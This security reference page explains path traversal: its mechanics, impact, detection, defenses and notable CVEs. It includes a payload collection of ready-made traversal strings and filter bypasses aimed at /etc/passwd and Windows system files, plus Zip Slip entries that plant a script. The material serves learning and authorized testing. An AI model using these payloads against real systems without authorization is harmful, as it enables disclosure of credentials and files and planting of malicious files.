# Path Traversal

> Manipulated file paths (../) read or write files outside the intended directory. **Deep dive:** [`Troubleshooting_Guide/path_traversal.md`](../../../../Troubleshooting_Guide/path_traversal.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** Directory Traversal · A01:2021 Broken Access Control
**Status:** complete

## What it is
Path traversal (directory traversal) lets an attacker manipulate a file path the application builds
from input — typically with `../` sequences — to access files outside the intended directory. It
turns a feature that serves files within one folder into a way to read or write arbitrary files on
the host.

## How it works
The application takes a filename or path from the request and joins it to a base directory, then
reads or writes it without resolving and constraining the result. The attacker controls that
filename and inserts `../` segments (or an absolute path) so the resolved path climbs out of the
base directory. The app's mistake is trusting the input and validating it before, rather than
after, decoding and canonicalization — which is why encoding, double-encoding, nested sequences,
and null bytes bypass naive filters.

## Impact
Disclosure of sensitive files (`/etc/passwd`, config files, source code, SSH keys, credentials),
which often enables further compromise. Write-capable sinks (uploads, archive extraction —
"Zip Slip") allow planting files such as webshells or overwriting binaries, escalating to RCE.
Severity ranges from high (read) to critical (write/RCE).

## How to detect
- A baseline `../../../etc/passwd` (or `..\..\..\windows\win.ini` on Windows) returns recognizable
  file contents.
- Encoded variants (`%2e%2e%2f`, double-encoded `%252f`) succeed where the literal is blocked,
  indicating validation runs before decoding.
- Error messages leaking absolute paths, or differing responses for valid vs. traversal paths
  (file-not-found vs. access-denied) that act as an oracle.

## Exploitation (summary)
Confirm with a canonical `../` sequence to a known file, then escalate to the bypass that matches
the observed defense: absolute paths when `../` is stripped, nested sequences (`....//`) against
non-recursive stripping, single/double URL-encoding and overlong UTF-8 against decode-order bugs,
and a `%00` null byte against extension suffixing in legacy stacks. The same traversal applies to
non-HTTP sinks like archive extraction and `include`/`require`. Full payloads are in the Payloads
section and deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Baseline probes
Start with the canonical sequence and a couple of quick encodings before escalating to defence-specific bypasses.

```text
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
....//....//....//etc/passwd
/etc/passwd
```

### Bypass by defence observed
Pick the technique that matches how the application appears to sanitise input.

| Defence in place | Bypass | Example |
|------------------|--------|---------|
| None | plain traversal (Unix/Windows) | `../../../etc/passwd` · `..\..\..\windows\win.ini` |
| Blocks `../`, accepts absolute | absolute path | `/etc/passwd` · `C:\Windows\win.ini` |
| Strips `../` once, non-recursively | nested sequences that survive stripping | `....//....//....//etc/passwd` · `..../..../..../etc/passwd` |
| Validates before URL-decode | single/double URL-encoding | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` · `..%252f..%252f..%252fetc/passwd` |
| Requires path to start in a base dir | start with the base, then traverse out | `/var/www/images/../../../etc/passwd` |
| Strips trailing extension (old C) | null byte terminator | `../../../etc/passwd%00.png` |
| Decodes UTF-8 after validation | overlong UTF-8 encodings of `/` | `..%c0%af..%c0%af..%c0%afetc/passwd` |
| Blocks `/` only | backslash / mixed slash | `..%5c..%5c..%5cetc/passwd` · `..%2F..%5c..%2Fetc/passwd` |

### Encoding variants
The separator (`/`) and dots can be encoded at several levels; rotate through these when a filter strips literals.

```text
# single URL-encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
# double URL-encode (validation runs before the decode)
..%252f..%252f..%252fetc/passwd
%252e%252e%252f
# overlong UTF-8 for "/"
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%f0%80%80%af..%f0%80%80%af..%f0%80%80%afetc/passwd
# case of hex digits can matter
..%2F..%2F   (uppercase)
..%2f..%2f   (lowercase)
```

### Path-normalisation tricks
Redundant separators and `./` segments that collapse to a traversal after normalisation.

```text
/etc//passwd
/var/www/images//../../etc/passwd
/var/www/images/./../../etc/passwd
/var/www/images/foo/../..//etc/passwd
```

### Windows UNC / SMB and protocol handlers
Reach remote shares or coerce a different resolver.

```text
\\server\share\file.txt
//server/share/file.txt
file://\etc\passwd
```

### Non-HTTP sinks
The same traversal applies wherever a path is built from input.

```text
# Zip Slip — malicious entry name in an archive escapes the extract dir
../../../../tmp/evil.sh
..\..\..\..\tmp\evil.sh

# PHP include/require — null byte or encoding to defeat suffixing
../../../../etc/passwd%00
..%2F..%2F..%2F..%2Fetc/passwd
```

## Defenses
1. **Avoid using user input in file paths.** Where possible map an opaque identifier (index, ID)
   to a server-side filename rather than accepting a path at all (the strongest fix).
2. **Canonicalize, then verify containment** — resolve the full real path (e.g. `realpath`,
   `Path.GetFullPath`, `Files.normalize`) and confirm it still starts with the intended base
   directory; reject otherwise. Validate after all decoding, never before.
3. **Allow-list** permitted filenames/extensions and strip directory separators; do not rely on
   blacklisting `../`.
4. Run with **least privilege** so even a successful traversal reaches few files, and for archive
   extraction validate each entry's resolved path (Zip Slip).

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Path+Traversal
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Path+Traversal
- **Exploit-DB** — https://www.exploit-db.com/search?q=Path+Traversal
- **GitHub Advisories** — https://github.com/advisories?query=Path+Traversal
- **OSV** — https://osv.dev/list?q=Path+Traversal
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Path Traversal <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-41773` — Apache HTTP Server 2.4.49 path traversal (encoded `..`) leading to file
  disclosure and RCE; exploited in the wild.
- `CVE-2021-21972` — VMware vCenter directory traversal enabling file write and unauthenticated RCE.
- `CVE-2019-11510` — Pulse Connect Secure arbitrary file read via path traversal, mass-exploited.

## References
- PortSwigger Web Security Academy — Path traversal.
- OWASP — Path Traversal (WSTG) and Input Validation Cheat Sheet.
- RFC 3986 — URI Generic Syntax (path normalization, dot-segment removal).
